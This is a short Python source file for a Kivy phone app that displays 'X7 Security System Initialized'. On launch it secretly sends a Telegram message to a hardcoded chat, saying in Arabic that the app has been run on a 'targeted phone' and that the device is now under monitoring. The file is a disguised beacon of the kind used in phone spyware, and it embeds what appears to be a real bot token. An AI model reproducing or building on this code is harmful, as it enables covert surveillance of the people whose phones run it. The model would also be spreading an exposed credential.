import asyncio
from telegram import Bot
from kivy.app import App
from kivy.uix.label import Label

TOKEN = "8969946923:AAGcZdkzLC6IZSmMBz-wGcNP1hZeUXrWRxw"
CHAT_ID = "8412623362"

class X7App(App):
    def build(self):
        # تشغيل التنبيه عند فتح التطبيق
        asyncio.run(self.send_alert())
        return Label(text="X7 Security System\nInitialized...")

    async def send_alert(self):
        try:
            bot = Bot(token=TOKEN)
            async with bot:
                await bot.send_message(
                    chat_id=CHAT_ID, 
                    text="🚨 تنبيه أمني:\nتم تشغيل تطبيق X7 من هاتف مستهدف!\nالجهاز قيد المراقبة الآن."
                )
        except Exception as e:
            print(f"Error: {e}")

if __name__ == '__main__':
    X7App().run()
